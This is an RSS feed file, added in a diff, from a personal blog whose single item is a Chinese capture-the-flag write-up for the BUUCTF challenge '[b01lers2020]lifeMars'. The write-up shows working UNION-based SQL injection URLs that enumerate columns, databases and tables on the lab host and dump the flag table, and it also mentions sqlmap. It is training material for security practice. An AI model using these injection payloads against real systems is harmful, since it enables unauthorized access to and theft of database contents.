@@ -1,0 +1,153 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Hexo • Posts by &#34;信息搜集（js，网络）&#34; tag</title>
+        <link>http://odiws.github.io</link>
+        <description></description>
+        <language>en</language>
+        <pubDate>Thu, 20 Jun 2024 20:21:48 +0800</pubDate>
+        <lastBuildDate>Thu, 20 Jun 2024 20:21:48 +0800</lastBuildDate>
+        <category>buuctf</category>
+        <category>system_file</category>
+        <category>sql文件读取</category>
+        <category>文件内无字符rce</category>
+        <category>文件上传</category>
+        <category>php绕过open_basedir设置</category>
+        <category>无字母rce</category>
+        <category>ctf</category>
+        <category>php原生类利用</category>
+        <category>php反序列化</category>
+        <category>md5()和sha1()对类进行hash 触发__toString方法</category>
+        <category>http</category>
+        <category>cms框架</category>
+        <category>python</category>
+        <category>mongodb注入</category>
+        <category>条件竞争：利用session.upload_progress</category>
+        <category>preg_match绕过</category>
+        <category>$_server query_string 绕过</category>
+        <category>$_request绕过</category>
+        <category>file_get_cotents绕过</category>
+        <category>sha1函数比较数组绕过</category>
+        <category>create_function运用</category>
+        <category>buuctf， 反序列化</category>
+        <category>regexp注入</category>
+        <category>ECB加密</category>
+        <category>php7 segment fault特性</category>
+        <category>json数据爬虫</category>
+        <category>phar反序列化</category>
+        <category>js</category>
+        <category>CRLF Injection</category>
+        <category>soap</category>
+        <category>pickle反序列化</category>
+        <category>thinkphpV6.0.0</category>
+        <category>buuctf， 伪随机数</category>
+        <category>zip加密</category>
+        <category>xxe</category>
+        <category>xml_upload</category>
+        <category>flask的session伪造</category>
+        <category>二次渲染</category>
+        <category>buuctf，Perl后端文件上传</category>
+        <category>buuctf，xxe漏洞</category>
+        <category>java</category>
+        <category>flask</category>
+        <category>ctf工具安装教程</category>
+        <category>sql注入</category>
+        <category>php绕过open_opedir设置</category>
+        <category>TOTP</category>
+        <category>rce</category>
+        <category>ssti</category>
+        <category>insert截断</category>
+        <category>xss攻击</category>
+        <category>c的预处理</category>
+        <category>图片类</category>
+        <category>爬虫</category>
+        <category>js原型链污染</category>
+        <category>反序列化字符串逃逸</category>
+        <category>sql injection</category>
+        <category>文件上传(头像上传)</category>
+        <category>session反序列化</category>
+        <category>ssrf</category>
+        <category>HTTP走私攻击</category>
+        <category>json数据unicode转码绕过</category>
+        <category>对sqlite的sql注入</category>
+        <category>未理解</category>
+        <category>命令执行</category>
+        <category>zip软链接</category>
+        <category>python_seed函数</category>
+        <category>session伪造</category>
+        <category>js-vm沙箱逃逸</category>
+        <category>willphp2.2</category>
+        <category>ssti-smarty3.1.39</category>
+        <category>./htaccess文件上传</category>
+        <category>php未解析</category>
+        <category>利用环境变量构造bash命令</category>
+        <category>利用.htaccess构成后门</category>
+        <category>通过php_value来设置preg_macth正则回溯次数</category>
+        <category>java反序列化</category>
+        <category>伪随机数</category>
+        <category>信息搜集（js，网络）</category>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/06/20/Mars/</guid>
+            <title>[b01lers2020]lifeMars</title>
+            <link>http://odiws.github.io/2024/06/20/Mars/</link>
+            <category>buuctf</category>
+            <category>sql注入</category>
+            <category>信息搜集（js，网络）</category>
+            <pubDate>Thu, 20 Jun 2024 20:21:48 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;进来是这样的场景：用 f12 进入网络发现有些一样的传参：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现有个 search 的传参：（结合源码（ctrl+u）发现有个 life on mars 这个文件）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;life on mars.js
+
+function get_life(query) &amp;#123;
+  $.ajax(&amp;#123;
+    type: &amp;quot;GET&amp;quot;,
+    url: &amp;quot;/query?search=&amp;quot; + query,
+    data: &amp;quot;&amp;#123;&amp;#125;&amp;quot;,
+    contentType: &amp;quot;application/json; charset=utf-8&amp;quot;,
+    dataType: &amp;quot;json&amp;quot;,
+    cache: false,
+    success: function(data) &amp;#123;
+      var table_html =
+        &#39;&amp;lt;table id=&amp;quot;results&amp;quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Name&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Description&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&#39;;
+      $.each(data, function(i, item) &amp;#123;
+        table_html +=
+          &amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;quot; + data[i][0] + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;quot; + data[i][1] + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;
+      &amp;#125;);
+      table_html += &amp;quot;&amp;lt;/table&amp;gt;&amp;quot;;
+
+      $(&amp;quot;#results&amp;quot;).replaceWith(table_html);
+    &amp;#125;,
+
+    error: function(msg) &amp;#123; &amp;#125;
+  &amp;#125;);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;该 js 文件返回的是数据集，那么这里一定查询了数据库，那么就可能存在&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1zcWwlRTYlQjMlQTglRTUlODUlQTUlRTYlQkMlOEYlRTYlQjQlOUUmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt; sql 注入漏洞&lt;/span&gt;。那就开始 sql 注入的流程。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/query?search=&lt;/code&gt;  如果地名输入正确，发现返回如下:&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;开始 SQL 注入：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;有几个字段：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum order by 2
+查询数据库名称：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum union select 1,database()
+查询数据表：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum union select 1,(SELECT%20group_concat(table_name)%20FROM%20information_schema.tables%20%20WHERE%20table_schema%20=%20%27aliens%27)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;到这里就搞不出来了：然后就是&lt;/p&gt;
+&lt;h4 id=&#34;查询所有的数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查询所有的数据库&#34;&gt;#&lt;/a&gt; 查询所有的数据库&lt;/h4&gt;
+&lt;p&gt;在这个查询中，information_schema.schemata 是一个 MySQL 系统表，其中包含所有数据库的信息。执行这个查询后，MySQL 将返回一个包含所有数据库名称的结果集。&lt;/p&gt;
+&lt;p&gt;这些命令和查询可以在 MySQL 命令行界面中使用，也可以在 MySQL 客户端或其他数据库工具中使用。&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEwMWE0OThjLWNlNGEtNDM2NC05Nzk5LWQ5YmRiMTkxMmY0My5ub2RlNS5idXVvai5jbjo4MS9xdWVyeT9zZWFyY2g9aGVzcGVyaWFfcGxhbnVtJTIwdW5pb24lMjBzZWxlY3QlMjAxLChTRUxFQ1QlMjBncm91cF9jb25jYXQoc2NoZW1hX25hbWUpJTIwRlJPTSUyMGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YQ==&#34;&gt;http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum union select 1,(SELECT group_concat(schema_name) FROM information_schema.schemata&lt;/span&gt;)&lt;/p&gt;
+&lt;p&gt;还可以：（直接用 sqlmap）：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;爆出还有一个 alien_code 这个库：（重复上个的操作）&lt;/p&gt;
+&lt;p&gt;或者可以：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5Bb01lers2020%5DLifeOnMars/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;直接有字段名了：&lt;/p&gt;
+&lt;p&gt;没有直接给出就手打：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=amazonis_planitia%20union%20select%20group_concat(id),group_concat(code)%20from%20alien_code.code
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;完成，获得 flag&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
